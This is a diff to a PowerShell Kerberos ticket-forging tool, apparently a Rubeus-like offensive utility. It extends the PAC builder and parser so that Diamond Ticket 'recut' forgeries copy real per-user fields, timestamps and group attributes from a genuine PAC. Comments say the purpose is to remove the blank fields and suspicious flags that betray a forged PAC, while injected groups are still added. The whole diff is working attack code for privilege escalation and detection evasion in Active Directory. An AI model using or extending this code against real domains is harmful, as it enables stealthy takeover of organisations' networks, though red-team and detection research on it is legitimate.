@@ -531,8 +531,30 @@ function Build-KerbValidationInfo {
         [datetime]$LogoffTime,
 
         [Parameter(Mandatory=$false)]
-        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT
+        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,
+
+        # Optional "recut" source: when supplied (Diamond Ticket), real per-user values
+        # extracted from a genuine PAC override the synthetic defaults below, so the rebuilt
+        # KERB_VALIDATION_INFO mirrors the legitimate ticket instead of leaving the well-known
+        # blank/zeroed fields that betray a forged PAC. Recognized keys (all optional):
+        #   FullName, LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive, LogonServer (string)
+        #   LogonCount, BadPasswordCount (int)
+        #   GroupAttributes (uint32[] parallel to GroupRIDs)
+        #   LogoffTimeRaw, KickOffTimeRaw, PasswordLastSetRaw,
+        #   PasswordCanChangeRaw, PasswordMustChangeRaw (raw int64 FILETIME)
+        [Parameter(Mandatory=$false)]
+        [hashtable]$SourceInfo
     )
+
+    # Helper: pull a value from -SourceInfo, falling back to a default when the key is
+    # absent or null. Keeps the synthetic Golden/Silver behavior intact (no SourceInfo).
+    function Get-SourceValue {
+        param([string]$Key, $Default)
+        if ($SourceInfo -and $SourceInfo.ContainsKey($Key) -and $null -ne $SourceInfo[$Key]) {
+            return $SourceInfo[$Key]
+        }
+        return $Default
+    }
 
     # Set default times (use NEVER = 0x7FFFFFFFFFFFFFFF for most times like Rubeus)
     if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }
@@ -540,6 +562,23 @@ function Build-KerbValidationInfo {
     # NEVER times - using the raw FILETIME value that Rubeus uses
     # This is 0x7FFFFFFFFFFFFFFF in little-endian
     $NEVER_TIME = [int64]0x7FFFFFFFFFFFFFFF
+
+    # Resolve per-user values: real values from -SourceInfo (Diamond "recut") or
+    # the synthetic Golden/Silver defaults when no source is provided.
+    $srcFullName           = [string](Get-SourceValue 'FullName' "")
+    $srcLogonScript        = [string](Get-SourceValue 'LogonScript' "")
+    $srcProfilePath        = [string](Get-SourceValue 'ProfilePath' "")
+    $srcHomeDirectory      = [string](Get-SourceValue 'HomeDirectory' "")
+    $srcHomeDirectoryDrive = [string](Get-SourceValue 'HomeDirectoryDrive' "")
+    $srcLogonServer        = [string](Get-SourceValue 'LogonServer' "")
+    $srcLogonCount         = [uint16](Get-SourceValue 'LogonCount' 0)
+    $srcBadPasswordCount   = [uint16](Get-SourceValue 'BadPasswordCount' 0)
+    $srcLogoffTime         = [int64](Get-SourceValue 'LogoffTimeRaw' $NEVER_TIME)
+    $srcKickOffTime        = [int64](Get-SourceValue 'KickOffTimeRaw' $NEVER_TIME)
+    $srcPasswordLastSet    = [int64](Get-SourceValue 'PasswordLastSetRaw' $NEVER_TIME)
+    $srcPasswordCanChange  = [int64](Get-SourceValue 'PasswordCanChangeRaw' $NEVER_TIME)
+    $srcPasswordMustChange = [int64](Get-SourceValue 'PasswordMustChangeRaw' $NEVER_TIME)
+    $srcGroupAttributes    = Get-SourceValue 'GroupAttributes' $null
 
     # NDR pointer IDs (unique pointers, must not collide with top-level referent 0x00020000)
     # Pointer IDs are incremented by 4 (not 1) to maintain 4-byte alignment
@@ -570,50 +609,50 @@ function Build-KerbValidationInfo {
     # LogonTime (FILETIME)
     $fixedPart += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $LogonTime)
 
-    # LogoffTime (FILETIME) - NEVER like Rubeus
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    # LogoffTime (FILETIME) - real value (recut) or NEVER like Rubeus
+    $fixedPart += Write-Int64LE -Value $srcLogoffTime
 
-    # KickOffTime (FILETIME) - NEVER like Rubeus
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    # KickOffTime (FILETIME)
+    $fixedPart += Write-Int64LE -Value $srcKickOffTime
 
-    # PasswordLastSet (FILETIME) - NEVER like Rubeus
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    # PasswordLastSet (FILETIME)
+    $fixedPart += Write-Int64LE -Value $srcPasswordLastSet
 
-    # PasswordCanChange (FILETIME) - NEVER like Rubeus
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    # PasswordCanChange (FILETIME)
+    $fixedPart += Write-Int64LE -Value $srcPasswordCanChange
 
-    # PasswordMustChange (FILETIME) - NEVER like Rubeus
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    # PasswordMustChange (FILETIME)
+    $fixedPart += Write-Int64LE -Value $srcPasswordMustChange
 
     # EffectiveName (RPC_UNICODE_STRING)
     $ptrEffectiveName = $ptrId; $ptrId += $ptrIdStep
     $fixedPart += Write-UnicodeStringRPC -Value $UserName -PointerId $ptrEffectiveName
 
-    # FullName (RPC_UNICODE_STRING) - empty, but Rubeus still allocates a pointer
+    # FullName (RPC_UNICODE_STRING) - real value (recut) or empty; Rubeus still allocates a pointer
     $ptrFullName = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrFullName
+    $fixedPart += Write-UnicodeStringRPC -Value $srcFullName -PointerId $ptrFullName
 
-    # LogonScript (RPC_UNICODE_STRING) - empty
+    # LogonScript (RPC_UNICODE_STRING)
     $ptrLogonScript = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonScript
+    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonScript -PointerId $ptrLogonScript
 
-    # ProfilePath (RPC_UNICODE_STRING) - empty
+    # ProfilePath (RPC_UNICODE_STRING)
     $ptrProfilePath = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrProfilePath
+    $fixedPart += Write-UnicodeStringRPC -Value $srcProfilePath -PointerId $ptrProfilePath
 
-    # HomeDirectory (RPC_UNICODE_STRING) - empty
+    # HomeDirectory (RPC_UNICODE_STRING)
     $ptrHomeDir = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDir
+    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectory -PointerId $ptrHomeDir
 
-    # HomeDirectoryDrive (RPC_UNICODE_STRING) - empty
+    # HomeDirectoryDrive (RPC_UNICODE_STRING)
     $ptrHomeDirDrive = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDirDrive
+    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectoryDrive -PointerId $ptrHomeDirDrive
 
-    # LogonCount (USHORT) - Rubeus uses 0
-    $fixedPart += Write-UInt16LE -Value 0
+    # LogonCount (USHORT) - real value (recut) or 0
+    $fixedPart += Write-UInt16LE -Value $srcLogonCount
 
     # BadPasswordCount (USHORT)
-    $fixedPart += Write-UInt16LE -Value 0
+    $fixedPart += Write-UInt16LE -Value $srcBadPasswordCount
 
     # UserId (ULONG) - User RID
     $fixedPart += Write-UInt32LE -Value $UserRID
@@ -646,9 +685,9 @@ function Build-KerbValidationInfo {
     # UserSessionKey (USER_SESSION_KEY - 16 bytes, all zeros)
     $fixedPart += [byte[]]::new(16)
 
-    # LogonServer (RPC_UNICODE_STRING) - empty like Rubeus
+    # LogonServer (RPC_UNICODE_STRING) - real value (recut) or empty like Rubeus
     $ptrLogonServer = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonServer
+    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonServer -PointerId $ptrLogonServer
 
     # LogonDomainName (RPC_UNICODE_STRING)
     $ptrLogonDomain = $ptrId; $ptrId += $ptrIdStep
@@ -709,33 +748,41 @@ function Build-KerbValidationInfo {
     # EffectiveName string data
     $referentData += Write-UnicodeStringData -Value $UserName
 
-    # FullName string data (empty - referent data is just MaxCount=0, Offset=0, ActualCount=0)
-    $referentData += Write-UnicodeStringData -Value ""
+    # FullName string data (real value for recut, else empty)
+    $referentData += Write-UnicodeStringData -Value $srcFullName
 
-    # LogonScript string data (empty)
-    $referentData += Write-UnicodeStringData -Value ""
+    # LogonScript string data
+    $referentData += Write-UnicodeStringData -Value $srcLogonScript
 
-    # ProfilePath string data (empty)
-    $referentData += Write-UnicodeStringData -Value ""
+    # ProfilePath string data
+    $referentData += Write-UnicodeStringData -Value $srcProfilePath
 
-    # HomeDirectory string data (empty)
-    $referentData += Write-UnicodeStringData -Value ""
+    # HomeDirectory string data
+    $referentData += Write-UnicodeStringData -Value $srcHomeDirectory
 
-    # HomeDirectoryDrive string data (empty)
-    $referentData += Write-UnicodeStringData -Value ""
+    # HomeDirectoryDrive string data
+    $referentData += Write-UnicodeStringData -Value $srcHomeDirectoryDrive
 
     # GroupIds array (if present)
     if ($groupCount -gt 0) {
         # NDR conformant array: MaximumCount
         $referentData += Write-UInt32LE -Value $groupCount
 
-        foreach ($rid in $GroupRIDs) {
-            $referentData += New-GroupMembership -RelativeId $rid
+        # Use per-group attributes from the source PAC when available (recut), so preserved
+        # groups keep their real SE_GROUP_* flags. Index-aligned with $GroupRIDs; injected
+        # groups beyond the source list fall back to the default attributes.
+        $srcGroupAttrsArr = if ($null -ne $srcGroupAttributes) { @($srcGroupAttributes) } else { @() }
+        for ($gi = 0; $gi -lt $GroupRIDs.Count; $gi++) {
+            if ($gi -lt $srcGroupAttrsArr.Count) {
+                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi] -Attributes ([uint32]$srcGroupAttrsArr[$gi])
+            } else {
+                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi]
+            }
         }
     }
 
-    # LogonServer string data (empty like Rubeus)
-    $referentData += Write-UnicodeStringData -Value ""
+    # LogonServer string data (real value for recut, else empty like Rubeus)
+    $referentData += Write-UnicodeStringData -Value $srcLogonServer
 
     # LogonDomainName string data
     $referentData += Write-UnicodeStringData -Value $Domain.ToUpper()
@@ -1143,7 +1190,22 @@ function Build-PAC {
         [datetime]$LogonTime,
 
         [Parameter(Mandatory=$true)]
-        [datetime]$AuthTime
+        [datetime]$AuthTime,
+
+        # The user's primary group RID. Defaults to Domain Users; Diamond "recut" passes the
+        # real value extracted from the genuine PAC.
+        [Parameter(Mandatory=$false)]
+        [uint32]$PrimaryGroupRID = $Script:DOMAIN_GROUP_RID_USERS,
+
+        # UAC flags for the account. Defaults to NORMAL_ACCOUNT; Diamond "recut" passes the
+        # real value so suspicious synthetic flags are not introduced.
+        [Parameter(Mandatory=$false)]
+        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,
+
+        # Optional rich per-user fields for the Diamond Ticket "recut" rebuild (see
+        # Build-KerbValidationInfo -SourceInfo). Ignored for Golden/Silver (not passed).
+        [Parameter(Mandatory=$false)]
+        [hashtable]$SourceInfo
     )
 
     if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }
@@ -1174,9 +1236,19 @@ function Build-PAC {
 
     # Build individual PAC buffers
     # Force conversion to byte[] - PowerShell array concatenation creates Object[]
-    $validationInfo = [byte[]](Build-KerbValidationInfo -UserName $UserName -Domain $Domain `
-        -DomainSID $DomainSID -UserRID $UserRID -GroupRIDs $GroupRIDs `
-        -ExtraSIDs $ExtraSIDs -LogonTime $LogonTime)
+    $validationInfoParams = @{
+        UserName   = $UserName
+        Domain     = $Domain
+        DomainSID  = $DomainSID
+        UserRID    = $UserRID
+        GroupRIDs  = $GroupRIDs
+        ExtraSIDs  = $ExtraSIDs
+        LogonTime  = $LogonTime
+        PrimaryGroupRID    = $PrimaryGroupRID
+        UserAccountControl = $UserAccountControl
+    }
+    if ($SourceInfo) { $validationInfoParams['SourceInfo'] = $SourceInfo }
+    $validationInfo = [byte[]](Build-KerbValidationInfo @validationInfoParams)
 
     # CLIENT_INFO.ClientId MUST match EncTicketPart.authtime for DC validation!
     $clientInfo = [byte[]](Build-PACClientInfo -ClientName $UserName -ClientId $AuthTime)
@@ -1580,9 +1652,25 @@ function Read-PAC {
             UserRID = $null
             PrimaryGroupRID = $null
             GroupRIDs = @()
+            GroupAttributes = @()
             ExtraSIDs = @()
             LogonTime = $null
             UserAccountControl = $null
+            # Rich fields preserved for faithful Diamond Ticket rebuild
+            FullName = ""
+            LogonScript = ""
+            ProfilePath = ""
+            HomeDirectory = ""
+            HomeDirectoryDrive = ""
+            LogonServer = ""
+            LogonCount = 0
+            BadPasswordCount = 0
+            UserFlags = 0
+            LogoffTimeRaw = $null
+            KickOffTimeRaw = $null
+            PasswordLastSetRaw = $null
+            PasswordCanChangeRaw = $null
+            PasswordMustChangeRaw = $null
             ServerChecksumOffset = $null
             KDCChecksumOffset = $null
             ServerChecksum = $null
@@ -1614,9 +1702,24 @@ function Read-PAC {
                     $result.UserRID = $logonInfo.UserRID
                     $result.PrimaryGroupRID = $logonInfo.PrimaryGroupRID
                     $result.GroupRIDs = $logonInfo.GroupRIDs
+                    $result.GroupAttributes = $logonInfo.GroupAttributes
                     $result.ExtraSIDs = $logonInfo.ExtraSIDs
                     $result.LogonTime = $logonInfo.LogonTime
                     $result.UserAccountControl = $logonInfo.UserAccountControl
+                    $result.FullName = $logonInfo.FullName
+                    $result.LogonScript = $logonInfo.LogonScript
+                    $result.ProfilePath = $logonInfo.ProfilePath
+                    $result.HomeDirectory = $logonInfo.HomeDirectory
+                    $result.HomeDirectoryDrive = $logonInfo.HomeDirectoryDrive
+                    $result.LogonServer = $logonInfo.LogonServer
+                    $result.LogonCount = $logonInfo.LogonCount
+                    $result.BadPasswordCount = $logonInfo.BadPasswordCount
+                    $result.UserFlags = $logonInfo.UserFlags
+                    $result.LogoffTimeRaw = $logonInfo.LogoffTimeRaw
+                    $result.KickOffTimeRaw = $logonInfo.KickOffTimeRaw
+                    $result.PasswordLastSetRaw = $logonInfo.PasswordLastSetRaw
+                    $result.PasswordCanChangeRaw = $logonInfo.PasswordCanChangeRaw
+                    $result.PasswordMustChangeRaw = $logonInfo.PasswordMustChangeRaw
                     $result.RawValidationInfo = $bufferData
                     $result.RawValidationInfoOffset = $buffer.Offset
                     $result.RawValidationInfoSize = $buffer.Size
@@ -1688,15 +1791,31 @@ function Read-KerbValidationInfo {
 
     $result = [PSCustomObject]@{
         LogonTime = $null
-        LogoffTime = $null
         UserName = $null
         Domain = $null
         DomainSID = $null
         UserRID = $null
         PrimaryGroupRID = $null
         GroupRIDs = @()
+        GroupAttributes = @()
         ExtraSIDs = @()
         UserAccountControl = $null
+        # Rich identity/session fields preserved for Diamond Ticket "recut" (faithful PAC rebuild).
+        # FILETIME fields are kept as RAW int64 so they can be re-emitted byte-for-byte.
+        FullName = ""
+        LogonScript = ""
+        ProfilePath = ""
+        HomeDirectory = ""
+        HomeDirectoryDrive = ""
+        LogonServer = ""
+        LogonCount = 0
+        BadPasswordCount = 0
+        UserFlags = 0
+        LogoffTimeRaw = $null
+        KickOffTimeRaw = $null
+        PasswordLastSetRaw = $null
+        PasswordCanChangeRaw = $null
+        PasswordMustChangeRaw = $null
     }
 
     try {
@@ -1730,19 +1849,24 @@ function Read-KerbValidationInfo {
         $result.LogonTime = ConvertFrom-FileTime -FileTime $logonTime
         $offset += 8
 
-        # LogoffTime (8 bytes) - skip
+        # LogoffTime (8 bytes) - capture raw for faithful rebuild
+        $result.LogoffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
 
-        # KickOffTime (8 bytes) - skip
+        # KickOffTime (8 bytes)
+        $result.KickOffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
 
-        # PasswordLastSet (8 bytes) - skip
+        # PasswordLastSet (8 bytes)
+        $result.PasswordLastSetRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
 
-        # PasswordCanChange (8 bytes) - skip
+        # PasswordCanChange (8 bytes)
+        $result.PasswordCanChangeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
 
-        # PasswordMustChange (8 bytes) - skip
+        # PasswordMustChange (8 bytes)
+        $result.PasswordMustChangeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
 
         # EffectiveName (RPC_UNICODE_STRING - 8 bytes)
@@ -1770,9 +1894,11 @@ function Read-KerbValidationInfo {
         $offset += 8
 
         # LogonCount (2 bytes)
+        $result.LogonCount = Read-UInt16LE -Data $Data -Offset $offset
         $offset += 2
 
         # BadPasswordCount (2 bytes)
+        $result.BadPasswordCount = Read-UInt16LE -Data $Data -Offset $offset
         $offset += 2
 
         # UserId (4 bytes)
@@ -1792,6 +1918,7 @@ function Read-KerbValidationInfo {
         $offset += 4
 
         # UserFlags (4 bytes)
+        $result.UserFlags = Read-UInt32LE -Data $Data -Offset $offset
         $offset += 4
 
         # UserSessionKey (16 bytes)
@@ -1888,33 +2015,38 @@ function Read-KerbValidationInfo {
             Write-Log "[Read-KerbValidationInfo] EffectiveName: '$($str.Value)'" -Level Debug
         }
 
-        # 2. FullName referent (skip value)
+        # 2. FullName referent
         if ($fullNamePtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.FullName = $str.Value
             $offset += $str.BytesConsumed
         }
 
-        # 3. LogonScript referent (skip)
+        # 3. LogonScript referent
         if ($logonScriptPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.LogonScript = $str.Value
             $offset += $str.BytesConsumed
         }
 
-        # 4. ProfilePath referent (skip)
+        # 4. ProfilePath referent
         if ($profilePathPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.ProfilePath = $str.Value
             $offset += $str.BytesConsumed
         }
 
-        # 5. HomeDirectory referent (skip)
+        # 5. HomeDirectory referent
         if ($homeDirPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.HomeDirectory = $str.Value
             $offset += $str.BytesConsumed
         }
 
-        # 6. HomeDirectoryDrive referent (skip)
+        # 6. HomeDirectoryDrive referent
         if ($homeDirDrivePtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.HomeDirectoryDrive = $str.Value
             $offset += $str.BytesConsumed
         }
 
@@ -1923,19 +2055,24 @@ function Read-KerbValidationInfo {
             # NDR conformant array: MaxCount(4) + GroupCount * (RID(4) + Attributes(4))
             $offset += 4  # Skip MaxCount
             $groups = @()
+            $groupAttrs = @()
             for ($g = 0; $g -lt $groupCount; $g++) {
                 if ($offset + 8 -gt $Data.Length) { break }
                 $rid = Read-UInt32LE -Data $Data -Offset $offset
+                $attr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
                 $groups += $rid
-                $offset += 8  # Skip RID(4) + Attributes(4)
+                $groupAttrs += $attr
+                $offset += 8  # RID(4) + Attributes(4)
             }
             $result.GroupRIDs = $groups
+            $result.GroupAttributes = $groupAttrs
             Write-Log "[Read-KerbValidationInfo] GroupRIDs: $($groups -join ', ')" -Level Debug
         }
 
-        # 8. LogonServer referent (skip value)
+        # 8. LogonServer referent
         if ($logonServerPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.LogonServer = $str.Value
             $offset += $str.BytesConsumed
         }
 
